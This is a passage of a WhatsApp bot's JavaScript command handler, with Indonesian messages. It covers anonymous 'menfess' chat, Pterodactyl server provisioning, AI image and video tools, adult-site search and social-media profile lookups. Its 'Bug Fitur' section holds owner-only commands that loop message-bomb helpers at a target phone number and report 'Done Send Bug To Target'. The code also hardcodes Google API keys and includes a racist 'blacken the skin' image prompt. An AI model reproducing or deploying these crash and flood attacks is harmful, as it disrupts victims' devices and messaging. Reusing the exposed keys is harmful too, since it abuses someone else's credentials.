    let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
    let other = [room, room.b].find(user => user !== m.sender)
    find.b = m.sender
    find.state = 'CHATTING'
    this.menfes[find.id] = {
        ...find
    }
    await Alice.sendMessage(other, {
        text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE:*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`,
        mentions: [m.sender]
    })
    Alice.sendMessage(m.chat, {
        text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE:*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`
    })
}
break

case 'tolakconfes':
case 'tolakmenfes':
case 'tolakconfess':
case 'tolakmenfess': {
if (isBan) return Xban()
await xreaction()
    roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
    if (!roof) return ReplyRynzz("Belum ada sesi menfess")
    let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
    let other = [room.a, room.b].find(user => user !== m.sender)
    find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
    Alice.sendMessage(other, {
        text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`,
        mentions: [m.sender]
    })
    ReplyRynzz("Menfess berhasil di tolak")
    delete this.menfes[roof.id]
}
break

case 'stopconfes':
case 'stopmenfes':
case 'stopconfess':
case 'stopmenfess': {
if (isBan) return Xban()
await xreaction()
    find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
    if (!find) return ReplyRynzz("Belum ada sesi menfess")
    const to = find.a == m.sender ? find.b : find.a
    Alice.sendMessage(to, {
        text: `Teman chat telah menghentikan menfess ini`,
        mentions: [m.sender]
    })
    ReplyRynzz("Menfess berhasil di stop")
    delete this.menfes[find.id]
}
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Menfess Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Bug Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

case "x-spam": {
if (!isOwner) return Xowner()
let y = text.split(",")
if (y.length < 2) return ReplyRybzz(`Example: ${XyrooRynzz} Nomor,Jumlah`)
let anu = y[0]
let jumlah = y[1]
let target = anu.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
await Xdelayy(target, jumlah)
await Alice.sendMessage(m.chat, { image: { url: thumb }, caption: `*Done Send Bug To Target\n*© XyrooRynzz 2025*`})
}
break

case "x-hama": {
if (!isOwner) return Xowner()
if (!q) return ReplyRynzz(`Example: ${XyrooRynzz} Nomor`)
let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
await Xdelayy(target, 30)
await Alice.sendMessage(m.chat, { image: { url: thumb }, caption: `Done Send Bug To Target\n*© XyrooRynzz 2025*`})
}
break

case "x-vision": {
if (!isOwner) return Xowner()
if (!q) return ReplyRynzz(`Example: ${XyrooRynzz} Nomor`)
let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
await Xdelayy(target, 50)
await Alice.sendMessage(m.chat, { image: { url: thumb }, caption: `Done Send Bug To Target\n*© XyrooRynzz 2025*`})
}
break

case 'x-vixiv': {
if (!isOwner) return Xowner()
if (!q) return ReplyRynzz(`Example: ${XyrooRynzz} Nomor`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"

for (let i = 0; i < 70; i++) {
await img1(target)
await img1(target)
await carousel(target)
await erwin(target)
}
let kucay = `
Done Send Bug To Target\n*© XyrooRynzz 2025*`
Alice.sendMessage(m.chat, { image: { url: thumb},
caption: kucay,
gifPlayback: false,
}, { quoted: m });

}
break

case 'x-maker': {
if (!isOwner) return Xowner()
if (!q) return ReplyRynzz(`Example: ${XyrooRynzz} Nomor`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await img1(target)
await img1(target)
await carousel(target)
await erwin(target)
}
let memem = `
Done Send Bug To Target\n*© XyrooRynzz 2025*`
Alice.sendMessage(m.chat, { image: { url: thumb },
caption: memem,
gifPlayback: false,
}, { quoted: m });
}
break
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Bug Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Panel Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

case "buatpanel": case "cpanel": {
if (!isPrem) return Xpremium()
if (!args[0]) return ReplyRynzz(`Masukkan Username`)
global.panel = [text.toLowerCase()]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: packname
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"⭐\", "rows": [{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".1gb ${teks}" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".2gb ${text}" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".3gb ${text}" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".4gb ${text}" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".5gb ${text}" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".6gb ${text}" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".7gb ${text}" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".8gb ${text}" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".9gb ${text}" },
{ "header": "Ram 10GB", "title": "Ram 10GB | CPU 250%", "id": ".10gb ${text}" }, 
{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU 0%", "id": ".unli ${text}" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: null}) 
await Alice.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unli": {
if (!isPrem) return Xpremium()
if (global.panel == null) return ReplyRynzz('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyRynzz(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = `${packname}`
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return ReplyRynzz(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyRynzz("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = textpanel
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: packname
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: null}) 
await Alice.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break  


case "delpanel": {
if (!isPrem) return Xpremium()
if (!text) return ReplyRynzz("id server")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return ReplyRynzz("Server panel tidak ditemukan!")
ReplyRynzz(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

                case "listsrv": {
if (!isPrem) return Xpremium()
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyplta
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Alice.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    ReplyRynzz(`Gunakan perintah ${Xyroo}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }        
}
break;
              case "listusr": {
if (!isPrem) return Xpremium()
  
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyplta
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Alice.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    ReplyRynzz(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Panel Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\



//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Premium Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
case 'aiedit': case 'editai': {
if (!isPrem) return Xpremium()
await xreaction()
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || "";
 if (!text) {
 return ReplyRynzz(`Harap masukkan prompt custom!\n\nContoh: ${XyrooRynzz} buatkan foto itu lebih estetik.`);
 }
 if (!mime) {
 return ReplyRynzz("Tidak ada gambar yang direply! Silakan reply gambar dengan format jpg/png.");
 }
 if (!/image\/(jpe?g|png)/.test(mime)) {
 return ReplyRynzz(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png.`);
 }
 try {
 let imgData = await q.download();
 let genAI = new GoogleGenerativeAI("AIzaSyB8T-3WnKqDbK3GSYYUtTiyDfIV-vBxoPw");
 const base64Image = imgData.toString("base64");
 const contents = [
 { text: text }, 
 {
 inlineData: {
 mimeType: mime,
 data: base64Image
 }
 }
 ];
 const model = genAI.getGenerativeModel({
 model: "gemini-2.0-flash-exp-image-generation",
 generationConfig: {
 responseModalities: ["Text", "Image"]
 },
 });
 const response = await model.generateContent(contents);
 let resultImage;
 let resultText = "";
 for (const part of response.response.candidates[0].content.parts) {
 if (part.text) {
 resultText += part.text;
 } else if (part.inlineData) {
 const imageData = part.inlineData.data;
 resultImage = Buffer.from(imageData, "base64");
 }
 }
 if (resultImage) {
 const tmpDir = path.join(process.cwd(), "tmp");
 if (!fs.existsSync(tmpDir)) {
 fs.mkdirSync(tmpDir, { recursive: true });
 }
 let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
 fs.writeFileSync(tempPath, resultImage);
 await Alice.sendMessage(m.chat, { 
 image: { url: tempPath },
 caption: `*Edit selesai sesuai permintaan!*`
 }, { quoted: m });
 setTimeout(() => {
 try {
 fs.unlinkSync(tempPath);
 } catch (err) {
 console.error("Gagal menghapus file sementara:", err);
 }
 }, 30000);
 } else {
 ReplyRynzz("Gagal memproses gambar.");
 }
 } catch (error) {
 console.error(error);
 ReplyRynzz(`Error: ${error.message}`);
 }
}
break 
case "hytamkan": {
if (!isPrem) return Xpremium()
await xreaction()
  if (!m.quoted) return ReplyRynzz(`Kirim/reply gambar dengan caption *${XyrooRynzz}*`);
  let mime = m.quoted.mimetype || "";
  let defaultPrompt = "Ubahlah Karakter Dari Gambar Tersebut Diubah Kulitnya Menjadi Hitam se hitam-hitam nya";

  if (!/image\/(jpe?g|png)/.test(mime)) return ReplyRynzz(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);

  let promptText = text || defaultPrompt;
  await xreaction()

  try {
    let imgData = await m.quoted.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0");

    const base64Image = imgData.toString("base64");

    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });

    const response = await model.generateContent(contents);

    let resultImage;
    let resultText = "";

    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }

    if (resultImage) {
      const tempPath = `./tmp/gemini_${Date.now()}.png`;
      fs.writeFileSync(tempPath, resultImage);

      await Alice.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Succes*`
      }, { quoted: m });

      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      ReplyRynzz("Gagal Menghitamkan.");
    }
  } catch (error) {
    console.error(error);
    ReplyRynzz(`Error: ${error.message}`);
  }
}
break;
            
case 'toanime': 
case 'toreal': {
if (!isPrem) return Xpremium()
    let actionType = ({ 
      toanime: 'anime2d',
      toreal: "anime2real"
    })[command]
    try {
      let media = await Alice.downloadAndSaveMediaMessage(qmsg);
      if (/image/.test(mime)) {
          await await xreaction(); 
              let url = await uploadToCatbox(media);
            let tryng = 0;
            let aifilter = await fetch(`${apii.xterm.url}/api/img2img/filters?action=${actionType}&url=${url}&key=${apii.xterm.key}`)
            .then(response => response.json());

            if(!aifilter.status) return ReplyRynzz(aifilter?.msg || "Error!")

            while (tryng < 50) {
                tryng += 1;
                let s = await fetch(`${apii.xterm.url}/api/img2img/filters/batchProgress?id=${aifilter.id}`)
                .then(response => response.json());

                if (s.status === 3) {
                  return Alice.sendMessage(m.chat, { image: { url: s.url } }, { quoted: m })                
                } else if (s.status === 4) {
                  ReplyRynzz("Maaf terjadi kesalahan. Coba gunakan gambar lain!");
                  return
                }
             await new Promise(resolve => setTimeout(resolve, 2000));
            }


      } else {
          ReplyRynzz(`Reply/kirim gambar dengan caption ${XyrooRynzz}`);
      }
      await fs.unlinkSync(media);
    } catch (err) {
      ReplyRynzz(`Error: ${err.message}`);
    }
}
break

case 'img2video': 
case 'luma': {
if (!isPrem) return Xpremium()
    const axios = require('axios');
    try {
      let media = await Alice.downloadAndSaveMediaMessage(qmsg);
      if (/image/.test(mime)) {
          await await xreaction(); 
              let url = await uploadToCatbox(media);
          const response = await axios.post(`${apii.xterm.url}/api/img2video/luma?key=${apii.xterm.key}${text ? ("&prompt=" + text) : ""}`, media, {
                headers: {
                    'Content-Type': 'application/octet-stream'
                },
                responseType: 'stream'
            })
             let rsp = "rfz"
            response.data.on('data', async (chunk) => {
                try {
                    const eventString = chunk.toString()
                    const eventData = eventString.match(/data: (.+)/)
                    if (eventData && eventData[1]) {
                        let data
                           try {
                              data = JSON.parse(eventData[1])
                            } catch (e) {
                              console.loc(eventData[1])
                              data = {}
                            }
                        switch (data.status) {
                            case "processing":
                              ReplyRynzz("Processing... _ini mungkin memakan waktu sekitar 1-5 menit!_")
                            break
                            case "failed":
                                await ReplyRynzz(data.status)
                                response.data.destroy()
                                break
                            case "completed":
                                await Alice.sendMessage(m.chat, { video: { url: data.video.url }, mimetype: "video/mp4" }, { quoted: m })
                                response.data.destroy()
                                break
                            default:
                                console.log('Unknown status:', data)
                        }
                    }
                } catch (e) {
                    console.error('Error processing chunk:', e.message)
                    response.data.destroy()
                    ReplyRynzz("Err!!")
                }
            })
      } else {
          ReplyRynzz(`Reply/kirim gambar dengan caption ${XyrooRynzz}`);
      }
      await fs.unlinkSync(media);
    } catch (err) {
      ReplyRynzz(`Error: ${err.message}`);
    }
}
break

case "animediff": {
if (!isPrem) return Xpremium()
  if(!text) return ReplyRynzz("Harap sertakan promptnya!")
  await await xreaction()
  await Alice.sendMessage(m.chat, { image: { url: apii.xterm.url + "/api/text2img/animediff?prompt="+text + "&key=" + apii.xterm.key } }, { quoted: m })
}
break
case "dalle3": {
if (!isPrem) return Xpremium()
  if(!text) return ReplyRynzz("Harap sertakan promptnya!")
  await await xreaction()
  await Alice.sendMessage(m.chat, { image: { url: apii.xterm.url + "/api/text2img/dalle3?prompt="+text + "&key=" + apii.xterm.key } }, { quoted: m })
}
break
case 'xnxxsearch': {
if (!isPrem) return Xpremium()
    if (!args[0]) return ReplyRynzz(`Tobat Woi\n\nExample : ${XyrooRynzz} Japanese`);

await xreaction()
    let data = await xnxxSearch(text);
    let results = data.result;

    if (results.length > 0) {
        let message = `Hasil dari pencarian ${text} :\n\n`;
        results.forEach((result) => {
            message += `Title : ${result.title}\nInfo : ${result.info}\nLink : ${result.link}\n\n`;
        });
        ReplyRynzz(message);
    } else {
        ReplyRynzz('Tidak Ada Hasil.');
    }
}
break;

case 'xnxxdl': {
if (!isPrem) return Xpremium()
    if (!args[0]) return ReplyRynzz(`Input Parameter Url Dari ${command}\n\nExample : ${XyrooRynzz} Url`);

await xreaction()
    let data = await xnxxDownloader(text);
    
    let capp = `XNXX DL\nTitle : ${data.title}\nDurasi : ${data.duration}\nUrl : ${data.URL}\n`;
    
    await Alice.sendMessage(m.chat, {
        video: {
            url: data.files.high
        },
        caption: capp,
    }, {
        quoted: m
    });
}
break;

case "hdvideo":
case "hdvid": {
    const { writeFile, unlink, mkdir } = require('fs').promises;
    const { existsSync } = require('fs');
    const path = require('path');

    if (!ffmpegStatic) {
        return ReplyRynzz('Send/Reply Videg Yang Ingin Di Hd Kan')
    }
    ffmpeg.setFfmpegPath(ffmpegStatic);
    let inputPath, outputPath;
    try {
        let q = m.quoted || m;
        let mime = q.mimetype || q.msg?.mimetype || q.mediaType || "";
        if (!mime) return Alice.sendMessage(m.chat, { text: "❌ Mana videonya?" }, { quoted: m });
        if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
            return Alice.sendMessage(m.chat, { text: `Format ${mime} tidak didukung!` }, { quoted: m });
        }
        Alice.sendMessage(m.chat, { text: "Meproses peningkatan, tunggu beberapa menit..."}, { quoted: m });
        let videoBuffer = await q.download?.();
        if (!videoBuffer) return Alice.sendMessage(m.chat, { text: "Gagal mengunduh video!" }, { quoted: m });
        let tempDir = path.join(__dirname, 'tmp');
        if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true });
        inputPath = path.join(tempDir, `input_${Date.now()}.mp4`);
        outputPath = path.join(tempDir, `output_${Date.now()}.mp4`);
        await writeFile(inputPath, videoBuffer);
        await new Promise((resolve, reject) => {
            ffmpeg(inputPath)
                .outputOptions([
                    '-vf', 'scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
                    '-r', '60',
                    '-preset', 'faster',
                    '-crf', '25',
                    '-c:v', 'libx264',
                    '-pix_fmt', 'yuv420p',
                    '-c:a', 'aac',
                    '-b:a', '128k'
                ])
                .on('end', resolve)
                .on('error', reject)
                .save(outputPath);
        });
        await Alice.sendMessage(m.chat, { 
            video: { url: outputPath },
            caption: `Berhasil\n${packname}`
        }, { quoted: m });
    } catch (err) {
        console.error("Error HD Video:", err);
        Alice.sendMessage(m.chat, { text: "Gagal meningkatkan kualitas video." }, { quoted: m });
    } finally {
        setTimeout(() => {
            if (inputPath) unlink(inputPath).catch(() => {});
            if (outputPath) unlink(outputPath).catch(() => {});
        }, 5000);
    }
}
break

		case 'ssweb': {
if (!isPrem) return Xpremium()
				if (!text) return ReplyRynzz(`Example: ${XyrooRynzz} https://`)
				if (!text.startsWith('http')) {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/https://' + q;
					await Alice.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				} else {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q;
					await Alice.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				}
			}
			break
			
case 'ytstalk': {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} XyrooRynzz`)
    const apiUrl = await fetchJson(`https://fastrestapis.fasturl.cloud/stalk/youtube?username=${text}`)
    const ytData = apiUrl.result

    if (ytData) {
      const response = `
*YOUTUBE STALKER:*\n
- Nama Channel: ${ytData.channel}
- Deskripsi: ${ytData.description ? ytData.description : 'Tidak ada'}
- URL Channel: ${ytData.url}
- Total Subscriber: ${ytData.additionalInfo.totalSubs}
- Total Video: ${ytData.additionalInfo.totalVideos}
- Total Views: ${ytData.additionalInfo.views}
- Bergabung pada: ${ytData.additionalInfo.join}
- Link Channel: ${ytData.additionalInfo.chUrl}
      
*Gambar Profil:*
${ytData.profile}

*Gambar Background:*
${ytData.bgUrl}
      `

      ReplyRynzz(response)
    }
  } catch (err) {
    console.error(err)
    ReplyRynzz('Terjadi kesalahan')
  }
}
break

case 'ttstalk': {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} djayyz_1`)

    const apiUrl = await fetchJson(`https://vapis.my.id/api/tt-stalk?username=${text}`)
    if (apiUrl && apiUrl.data) {
      const user = apiUrl.data.user
      const stats = apiUrl.data.stats

      const response = `
*Username:* ${user.uniqueId}
*Nickname:* ${user.nickname}
*Region:* ${user.region}
*Verified:* ${user.verified ? 'Yes' : 'No'}
*Followers:* ${stats.followerCount}
*Following:* ${stats.followingCount}
*Likes:* ${stats.heartCount}
*Videos:* ${stats.videoCount}
*Profile Picture:* ${user.avatarLarger}
`
      return ReplyRynzz(response)
    } 

    const co = await ttstalk(text)
    if (co.userInfo) {
      const cu = co.userInfo
      const respon = `
*Username:* ${cu.uniqueId}
*Nickname:* ${cu.nickname}
*Bio:* ${cu.bio}
*Followers:* ${cu.followers}
*Following:* ${cu.following}
*Likes:* ${cu.likes}
*Videos:* ${cu.videos}
*Profile Picture:* ${cu.avatar}
`
      return ReplyRynzz(respon)
    }

    ReplyRynzz('Gak ketemu username nya')
  } catch (err) {
    console.error(err)
    return ReplyRynzz('Terjadi kesalahan')
  }
}
break

case 'telegram': case 'tele': case 'telestalk': {
if (isBan) return Xban()
await xreaction()
  if (!q) return ReplyRynzz(`Masukkan usernamenya!\nContoh: ${XyrooRynzz} XyrooRynzz`)
  try {
    const res = await fetch(`https://www.velyn.biz.id/api/stalk/telegramstalk?username=${q}`)
    const json = await res.json()
    if (!json.status) return ReplyRynzz('Username tidak ditemukan!')
    const { title, description, url, image_url } = json.data
    const teks = `*Telegram Info*\n\n*Nama:* ${title}\n*Bio:* ${description}\n*Link:* ${url}`
    Alice.sendMessage(m.chat, {
      image: { url: image_url },
      caption: teks
    }, { quoted: m })
  } catch {
    ReplyRynzz('Gagal mengambil data.')
  }
}
  break

case 'igstalk': {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} cristiano`)
    const co = await igstalk(text)
    if (co) {
      const respon = `
*Username:* ${co.username}
*Full Name:* ${co.fullName}
*Bio:* ${co.bio}
*Website:* ${co.website || '-'}
*Verified:* ${co.verified ? 'Ya' : 'Tidak'}
*Posts:* ${co.posts}
*Followers:* ${co.followers}
*Following:* ${co.following}
*Profile Picture:* ${co.avatar}
`
      return ReplyRynzz(respon)
    }

    ReplyRynzz('Gak ketemu username-nya')
  } catch (err) {
    console.error(err)
    return ReplyRynzz('Terjadi kesalahan')
  }
}
break

case 'chstalk': {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} https://whatsapp.com/channel/abcdefg`)
    const co = await chstalk(text)
    if (co) {
      const respon = `
*Nama Channel:* ${co.nama}
*Pengikut:* ${co.pengikut}
*Deskripsi:* ${co.deskripsi}
*Link Channel:* ${co.linkChannel}
*Gambar:* ${co.gambar}
`
      return ReplyRynzz(respon)
    }

    ReplyRynzz('Gak ketemu channel nya')
  } catch (err) {
    console.error(err)
    return ReplyRynzz('Terjadi kesalahan')
  }
